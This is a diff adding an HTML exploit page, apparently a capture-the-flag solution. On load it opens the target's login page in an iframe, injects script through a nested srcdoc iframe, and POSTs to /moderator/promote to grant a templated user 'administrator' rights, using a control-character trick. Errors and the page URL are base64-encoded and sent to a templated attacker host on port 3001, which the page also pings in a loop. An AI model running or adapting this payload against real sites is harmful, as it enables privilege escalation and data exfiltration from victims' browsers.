@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script>
+
+
+
+
+function injectFunc() {
+fetch("/moderator/promote", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ username: "{{ username }}", permission: "\u001administrator"})
+}).catch(err => {fetch("{{ EXPLOIT_URL_TWO }}:3001/"+btoa(err)+"!"+btoa(document.location.href))})
+}
+
+function injectScript(frame) {
+    let doc = frame.contentDocument || frame.contentWindow.document
+    let iframe = document.createElement("iframe")
+    iframe.srcdoc = `<script>${injectFunc.toString()}; injectFunc()<\x2fscript>`
+    doc.body.append(iframe)
+}
+
+
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function pwn() {
+  fetch("/bye")
+for (let i = 0; i < 50; i++) {
+    await sleep(100);
+    fetch("{{ EXPLOIT_URL_TWO }}:3001/xbruh"+i)
+}
+
+
+frame = document.getElementById("frame")
+frame.src = window.location+"/../../login"
+await sleep(500)
+injectScript(frame)
+
+}
+</script>
+</head>
+<body onload="pwn()">
+<iframe id="frame"></iframe>
+</body>
+</html>
